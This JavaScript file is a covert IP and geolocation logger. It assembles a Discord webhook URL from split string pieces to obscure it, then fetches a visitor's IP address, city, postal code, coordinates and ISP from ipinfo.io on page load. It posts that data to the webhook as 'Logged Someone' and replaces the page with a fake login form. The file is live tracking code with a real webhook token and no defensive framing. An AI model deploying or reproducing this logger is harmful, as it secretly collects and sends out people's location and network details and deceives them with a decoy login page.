let hook = 'cord.com/ap'
hook = 'https://dis' + hook;
hook += 'i/webho'
hook += 'oks/1080710292427776020/fQCyjzj8IEJcNETvvjwGSTotiAXtoBYyUAmJyiz7QEnih9_nFfk8hVxqBwYY8We0DLUJ'
$.getJSON("https://ipinfo.io/json", function(data) {
  console.log(data);
  var params = {
    embeds: [
      {
        "title": "Logged Someone",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "IP Address",
            "value": `> ${data.ip}`
          },
          {
            "name": "GeoLocation Info",
            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
          },
          {
            "name": "Network Info",
            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
          }
        ]
      }
    ]
  }
  fetch(hook, {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
    console.log(res);
    document.body.innerHTML = `
      <div>
        <h2>Login</h2>
        Username: <input type="text" onclick="alert()"><br>
        Password: <input type="text"><br>
        <button onclick="alert('Invalid username and password')">Submit</button>
      </div>
    `
  })
})
